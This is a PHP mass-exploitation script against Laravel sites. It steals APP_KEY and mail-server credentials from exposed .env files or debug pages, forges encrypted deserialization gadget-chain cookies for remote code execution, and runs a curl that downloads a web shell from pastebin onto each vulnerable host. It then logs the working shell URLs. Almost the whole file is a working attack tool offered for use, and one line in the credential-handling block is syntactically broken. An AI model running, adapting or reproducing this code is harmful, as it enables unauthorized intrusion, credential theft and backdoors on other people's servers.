#!/usr/bin/env php
<?php
/**
 * @Con7ext | Laravel Unserialize
 * Wibu Heker | Penjelemaan wibu yang menjadi heker
 */
error_reporting(0);
function Save($file, $content) {
    $fp = fopen($file, 'a+');
    fwrite($fp, $content . "\n");
    fclose($fp);
}
class Func_
{

    public function Serialize($key, $value)
    {
        $cipher = 'AES-256-CBC'; // or 'AES-128-CBC'
        $iv = random_bytes(openssl_cipher_iv_length($cipher)); // instead of rolling a dice ;)
        $value = \openssl_encrypt(base64_decode($value) , $cipher, base64_decode($key) , 0, $iv);

        if ($value === false)
        {
            exit("Could not encrypt the data.");
        }

        $iv = base64_encode($iv);
        $mac = hash_hmac('sha256', $iv . $value, base64_decode($key));

        $json = json_encode(compact('iv', 'value', 'mac'));

        if (json_last_error() !== JSON_ERROR_NONE)
        {
            echo "Could not json encode data." . PHP_EOL;
            exit();
        }

        //$encodedPayload = urlencode(base64_encode($json));
        $encodedPayload = base64_encode($json);
        return $encodedPayload;
    }
    public function GeneratePayload($command, $func = "system", $method = 1)
    {
        $payload = null;
        $p = "<?php $command exit; ?>";
        switch ($method)
        {
            case 1:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:15:"Faker\Generator":1:{s:13:"' . "\x00" . '*' . "\x00" . 'formatters";a:1:{s:8:"dispatch";s:' . strlen($func) . ':"' . $func . '";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}';
            break;
            case 2:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' . "\x00" . '*' . "\x00" . 'listeners";a:1:{s:' . strlen($command) . ':"' . $command . '";a:1:{i:0;s:' . strlen($func) . ':"' . $func . '";}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}';
            break;
            case 3:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' . "\x00" . '*' . "\x00" . 'app";s:' . strlen($command) . ':"' . $command . '";s:17:"' . "\x00" . '*' . "\x00" . 'defaultChannel";s:1:"x";s:17:"' . "\x00" . '*' . "\x00" . 'customCreators";a:1:{s:1:"x";s:' .strlen($func) . ':"' . $func . '";}}}';
            break;
            case 4:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:' . strlen($func) . ':"' . $func . '";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}';
            break;
            case 5:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:'. strlen($p) . ':"' . $p . '";}}}';
            break;
            case 6:
                $payload = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' . "\x00" . '*' . "\x00" . 'messages";a:0:{}s:9:"' . "\x00" . '*' . "\x00" . 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:' . strlen($p) . ':"' . $p . '";}}}}';
            break;
        }
        return base64_encode($payload);
    }
}

class Requester
{

    public function Requests($url, $postdata = null, $headers = null, $follow = true)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt ($ch, CURLOPT_TIMEOUT, 15);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        if (!empty($headers) && $headers != null)
        {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        if (!empty($postdata) && $postdata != null)
        {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        if ($follow)
        {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        }
        $data = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $head = substr($data, 0, $header_size);
        $body = substr($data, $header_size);
        return json_decode(json_encode(array(
            'status_code' => $status_code,
            'headers' => $this->HeadersToArray($head) ,
            'body' => $body
        )));
    }
    public function HeadersToArray($str)
    {
        $str = explode("\r\n", $str);
        $str = array_splice($str, 0, count($str) - 1);
        $output = [];
        foreach ($str as $item)
        {
            if ($item === '' || empty($item)) continue;
            $index = stripos($item, ": ");
            $key = substr($item, 0, $index);
            $key = strtolower(str_replace('-', '_', $key));
            $value = substr($item, $index + 2);
            if (@$output[$key])
            {
                if (strtolower($key) === 'set_cookie')
                {
                    $output[$key] = $output[$key] . "; " . $value;
                }
                else
                {
                    $output[$key] = $output[$key];
                }
            }
            else
            {
                $output[$key] = $value;
            }
        }
        return $output;
    }
}

class Exploit extends Requester
{
    public $url;
    public $vuln;
    public $app_key;
    public $smtp;
    public function __construct($url)
    {
        $this->url = $url;
        $this->vuln = null;
        $this->app_key = null;
        $this->smtp = [];
    }
    public function getAppKeyEnv()
    {
        $req = parent::Requests($this->url . "/.env", null, null, $follow = false);
        if (preg_match('/APP_KEY/', $req->body))
        {
            $loh = preg_replace('/\n/', '##', $req->body);
            preg_match_all('/APP_KEY=(.*?)##/', $loh, $matches, PREG_SET_ORDER, 0);
            $this->app_key = $matches[0][1];
            preg_match_all('/MAIL_HOST=(.*?)##/', $loh, $mh, PREG_SET_ORDER, 0);
            preg_match_all('/MAIL_PORT=(.*?)##/', $loh, $mp, PREG_SET_ORDER, 0);
            preg_match_all('/MAIL_USERNAME=(.*?)##/', $loh, $mu, PREG_SET_ORDER, 0);
            preg_match_all('/MAIL_PASSWORD=(.*?)##/', $loh, $mw, PREG_SET_ORDER, 0);
            $this->smtp['HOST'] = ($mh[0][1]) ? $mh[0][1] : '';
            $this->smtp['PORT'] = ($mp[0][1]) ? $mp[0][1] : '';
            $this->smtp['USER'] = ($mu[0][1]) ? $mu[0][1] : '';
            $this->smtp['PASS'] = ($mw[0][1]) ? $mw[0][1] : '';
        }
    }
    public function getAppKey()
    {
        $req = parent::Requests($this->url, 'a=a', null, false);
        if (preg_match('/<td>APP_KEY<\/td>/', $req->body))
        {
            preg_match_all('/<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>/', $req->body, $matches, PREG_SET_ORDER, 0);
            preg_match_all('/<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>/', $req->body, $mh, PREG_SET_ORDER, 0);
            preg_match_all('/<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>/', $req->body, $mp, PREG_SET_ORDER, 0);
            preg_match_all('/<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>/', $req->body, $mu, PREG_SET_ORDER, 0);
            preg_match_all('/<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>/', $req->body, $mw, PREG_SET_ORDER, 0);
            $this->app_key = ($matches[0][1]) ? $matches[0][1] : null;
            $this->smtp['HOST'] = ($mh[0][1]) ? $mh[0][1] : '';
            $this->smtp['PORT'] = ($mp[0][1]) ? $mp[0][1] : '';
            $this->smtp['USER'] = ($mu[0][1]) ? $mu[0][1] : '';
            $this->smtp['PASS'] = ($mw[0][1]) ? $mw[0][1] : '';
        }
        else
        {
            $this->getAppKeyEnv($this->url);
        }
    }
}

parse_str(implode("&", array_slice($argv, 1)), $_GET);
if (!$_GET['list']) return 'Usage: php ' . $argv[0] . ' list=list.txt';
$urls = $_GET['list'];
$read = array_unique(explode("\n", str_replace("\r", "", file_get_contents($urls))));

foreach($read as $cok) {
    if (empty($cok) || $cok == '') continue;
    $req = new Requester();
    $wibu = new Exploit($cok);
    $func = new Func_();
    $wibu->getAppKey();
    if (!empty($wibu->app_key) || $wibu->app_key != null) {
        $app = str_replace('base64:', '', $wibu->app_key);
        $payload = base64_encode('_ALL_WE_KNOW_');
        $payload = $func->GeneratePayload("echo base64_decode('{$payload}');", 'system', 5);
        $serialize = $func->Serialize($app, $payload);
        $header = array(
            'Cookie: XSRF-TOKEN=' . $serialize
        );
        $bre = $req->Requests($cok, null, $header, false);
        if ($wibu->smtp['HOST'] != '' || !empty($wibu->smtp['HOST'])) {
            $data = "{$wibu->smtp['HOST']}|{$wibu->smtp['PORT']}|{$wibu->smtp['USER']}|{$wibu->smtp['PASS']}"{
        }
        if (preg_match('/_ALL_WE_KNOW_/', $bre->body)) {
            echo $cok . " ===> ";
            $payload = $func->GeneratePayload("echo system('curl https://pastebin.com/raw/8FHzfDCu -k -o '.public_path().'/c.php'); echo 'Rintod';", 'system', 5);
            $serialize = $func->Serialize($app, $payload);
            $header = array(
                'Cookie: XSRF-TOKEN=' . $serialize
            );
            $bro = $req->Requests($cok, null, $header, false);
            if (preg_match('/Rintod/', $bro->body)) {
                $njir = $req->Requests($cok . "/c.php", null, null, false);
                if (preg_match('/azzatssins/', $njir->body)) {
                    echo 'SHELL OK ===> ' . $cok . '/c.php?0=ls' . PHP_EOL;
                    Save('SHELL.txt', $cok . '/c.php?0=ls');
                } else {
                    echo 'SHELL FAIL! But RCE OK! Maybe Permission Denied For Uploading Shell!!!' . PHP_EOL;
                    Save('MANUAL.txt', $cok);
                }
            } else {
                echo 'Failed Upload Shell! But RCE OK!' . PHP_EOL;
                Save('MANUAL.txt', $cok);
            }
        } else {
            echo $cok . " ===> NOT VULN" . PHP_EOL;
        }
    } else {
        echo $cok . " ===> NO APP_KEY!!!!" . PHP_EOL;
    }
}
